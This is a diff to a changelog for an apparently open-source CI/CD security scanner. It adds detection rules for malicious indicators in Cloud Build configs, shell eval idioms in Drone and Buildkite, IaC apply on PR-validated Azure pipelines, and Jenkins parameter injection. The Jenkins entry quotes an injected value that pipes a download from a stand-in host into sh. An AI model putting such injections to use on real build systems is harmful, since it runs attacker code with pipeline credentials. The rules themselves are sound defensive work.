@@ -12,6 +12,53 @@ release commit collapses this section into `## [X.Y.Z] - <date>`.
 
 ### Added
 
+- **GCB-027: Cloud Build config contains indicators of malicious activity
+  (CRITICAL).** Flags specific compromise evidence (reverse shells,
+  base64-decoded execution, miner binaries, Discord/Telegram webhooks,
+  credential-dump pipes, audit-erasure commands) in a `cloudbuild.yaml`. The
+  Google Cloud Build analog of GHA-027 / GL-025 / BB-025 / ADO-026 / CC-026,
+  reusing the shared `_malicious` indicator catalog and `yaml_blob_check`.
+  Defaults to LOW confidence; matches inside `example` / `fixture` / `sample`
+  / `demo` / `test` keys are auto-suppressed. cloudbuild 26 -> 27.
+- **DR-017: dangerous shell idiom in a Drone step command (HIGH).** Flags
+  `eval "$VAR"` / `sh -c "$VAR"` / backtick exec in a step's `commands:`,
+  completing the dangerous-shell-idiom family across every CI provider
+  (GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 / BK-016). Reuses the shared
+  `shell_eval` primitive and scans each `commands:` entry on container-flavored
+  pipelines; the `eval "$(ssh-agent -s)"` literal-bootstrap form stays out of
+  scope. drone 16 -> 17.
+- **BK-016: dangerous shell idiom in a Buildkite step command (HIGH).** Flags
+  `eval "$VAR"` / `sh -c "$VAR"` / backtick exec in a step `command:`, the
+  Buildkite analog of GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 (the one
+  CI provider that still lacked it). Fires on the intrinsically risky idiom
+  regardless of whether the value's source is currently trusted, because the
+  idiom hands the value full shell-grammar reach. Reuses the shared
+  `shell_eval` primitive; the `eval "$(ssh-agent -s)"` literal-bootstrap form
+  is intentionally not flagged. buildkite 16 -> 17.
+- **ADO-033: IaC apply on a PR-validated pipeline (CRITICAL).** Flags an IaC
+  apply command (`terraform apply` / `cloudformation deploy` / `cdk deploy` /
+  `pulumi up` / `sam deploy` / `terragrunt apply`) in a `script:` / `bash:` /
+  `pwsh:` / `powershell:` step (or a task's `inputs.script`) on an Azure
+  DevOps pipeline that opts into PR validation (`pr:` set to anything but
+  `none` / `false`). The PR branch's IaC runs at apply time, so an `external`
+  data source or a `local-exec` provisioner executes arbitrary code on the
+  agent with the service-connection credentials before the change is reviewed.
+  The Azure DevOps analog of GHA-117 / GL-041 / BB-033, reusing the shared
+  `IAC_APPLY_RE` primitive and the `pr:` heuristic from ADO-011 / ADO-019.
+  azure 32 -> 33.
+- **JF-036: shell step interpolates a build parameter (`params.*`) (HIGH).**
+  Flags a `${params.X}` spliced into a double-quoted `sh` / `bat` /
+  `powershell` body. A Jenkins build parameter is set by whoever queues the
+  run (anyone with Build permission, an upstream `build job:` passing
+  `parameters:`, or a webhook trigger); a `string` parameter is free-form
+  text that Groovy substitutes into the command before the shell parses it,
+  so `params.X = "x; curl evil | sh"` runs on the agent in the build's
+  credential context. The Jenkins peer of the GHA `${{ inputs.X }}` and ADO
+  `${{ parameters.X }}` injection rules. Single-quoted Groovy bodies (which
+  don't interpolate) are not flagged. Distinct from JF-002 (SCM env vars),
+  JF-032 (agent labels), and JF-033 (`withCredentials` secret leak); the
+  shared `params.*` taint pattern is now factored into `PARAMS_TAINT_RE`.
+  jenkins 35 -> 36.
 - **BB-033: IaC apply on a pull-request pipeline (CRITICAL).** Flags a
   `terraform apply` / `cloudformation deploy` / `cdk deploy` / `pulumi up` /
   `sam deploy` in a step under Bitbucket's `pull-requests:` section, where
